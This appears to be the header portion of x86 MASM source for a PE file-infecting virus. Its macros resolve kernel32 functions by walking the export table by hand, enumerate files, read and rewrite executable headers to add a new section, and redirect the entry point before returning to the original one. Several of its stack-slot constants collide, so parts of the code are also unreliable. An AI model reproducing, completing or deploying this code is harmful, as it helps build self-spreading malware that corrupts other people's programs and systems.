;include \Masm32\include\masm32rt.inc

.386
.model flat, stdcall
option casemap: none

; .const
	; Order of each variable IN THE STACK
	; Position relative to r|ebp calculated by -(Order * regSz)
    selfName EQU 11
	selfImageBaseAddress EQU 1
	selfSection EQU 2
	selfEntry EQU 3
	selfHand EQU 4
	
	tgHand EQU 5
	tgImageBaseAddress EQU 1
    tgNewSection EQU 3
	tgNewEntry EQU 4
	lfanew EQU 5
	NumberOfSections EQU 6 ; Before injection
	SizeOfOptionalHeader EQU 7
	ioh_offset EQU 8
	Magic EQU 9 ; 10Bh => 32=bit; 20Bh => 64-bit
	AddressOfEntryPoint EQU 10
	SectionAlignment EQU 11
	FileAlignment EQU 12
	lastish_offset EQU 14
	lastish_SectionOffset EQU 13
	lastish_VA EQU 15
	lastish_SizeOfRawData EQU 16
	newish_offset EQU 17
	
	
    kernel32dll EQU 5
    OrdinalTbl EQU 6
    NamePtrTbl EQU 7
    AddrTbl EQU 8
    k32NumFunc EQU 9
    user32dll EQU 10
    
	fileHand EQU 4 ; From FindFirstFile, for FindNextFile
    ffind1 EQU 12 		; FindFirstFileA
    ffind2 EQU 13 		; FindNextFileA
    ffind0 EQU 14 		; FindClose
    fopen EQU 11 		; CreateFileA
    fseek EQU 17 		; SetFilePointer(Ex)
    fclose EQU 14 		; CloseHandle
    fread EQU 15 		; ReadFile
    fwrite EQU 16 		; WriteFile
    argv0 EQU 17
    loadlib EQU 17 		; LoadLibraryA
    getaddr EQU 18 		; GetProcAddress
    msgbox EQU 19 		; MessageBoxA
    
    ; Other constants for readability
    stack_reserved EQU 10 ; Number of values to be stored in the stack
    regSz EQU 4 ; 8 for 64-bit
    
    SEEK_SET EQU 0
    SEEK_CUR EQU 1
    SEEK_END EQU 2

stackAddr MACRO pos:REQ
	LOCAL temp
	temp = - pos * regSz
	EXITM <temp>
ENDM

toStack MACRO pos:REQ, value:=<eax>
    mov [ebp + stackAddr(pos)], value
ENDM

fromStack MACRO pos:REQ
	EXITM <[ebp + stackAddr(pos)]>
ENDM

; MACRO for accessing data regions
; selfSection required
daccess MACRO pStr:REQ
	LOCAL address
	address = pStr - data_start + fromStack(selfSection)
	EXITM <address>
ENDM

; Accessing values in data regions
vaccess MACRO pStr:REQ
	EXITM <DWORD PTR [daccess(pStr)]>
ENDM

k32import MACRO pFunc:REQ
	; Input the offset to a string that is the name of the queried function
	mov ebx, fromStack(kernel32dll)
	mov edx, fromStack(k32NumFunc)
	xor eax, eax
	
	loopback:
		mov edi, fromStack(NamePtrTbl)
		mov edi, [edi + eax*4]
		add edi, ebx
		mov esi, daccess(pFunc)
		cld ; DF = 0, ESI and EDI increments
		xor ecx, ecx
		add ecx, len(pFunc)
		cld
		repe cmpsb
	jz found
	
		inc eax
		cmp eax, edx
	jb loopback
	
	jmp old_entry
	
	found:
	mov edx, fromStack(OrdinalTbl)
	mov ax, [edx + eax * 2]
	mov edx, fromStack(AddrTbl)
	mov eax, [edx + eax * 4]
	mov edx, fromStack(kernel32dll)
	add eax, edx
	; eax now hold mem addr of function pointed to by pFunc
ENDM
	
getval MACRO handle:REQ, length:REQ, whence:=<SEEK_CUR>, disp:=<0>
	; handle MUST be obtained from stack beforehand
	; length should not be greater than 4 (32-bit)
;	LOCAL storage
;	IF length EQ 1
;		storage = daccess(offset tempByte)
;	ELSEIF length EQ 2
;		storage = daccess(offset tempWord)
;	ELSE
;		storage = daccess(offset tempDword)
;	ENDIF
	mov vaccess(offset tempDword), 0
	
	invoke fromStack(fseek), handle, disp, 0, whence
	
	push 0
	push daccess(offset tempDword2)
	push length
	push daccess(offset tempDword)
	push handle
	call fromStack(fread)
	; Retrieved value is stored in tempDword, depending on length
ENDM

setval MACRO handle:REQ, length:REQ, whence:=<SEEK_CUR>, disp:=<0>
	; handle MUST be obtained from stack beforehand
;	LOCAL storage
;	IF length EQ 1
;		storage = daccess(offset tempByte)
;	ELSEIF length EQ 2
;		storage = daccess(offset tempWord)
;	ELSE
;		storage = daccess(offset tempDword)
;	ENDIF
	
	invoke fromStack(fseek), handle, disp, 0, whence
	
	invoke fromStack(fwrite), handle, daccess(tempDword), length, daccess(tempDword2), 0
ENDM

closest MACRO actual:REQ, alignment:REQ
	mov eax, actual
	xor edx, edx
	mov esi, alignment
	idiv esi
	inc eax
	imul eax, alignment
	; Result is stored in eax
ENDM
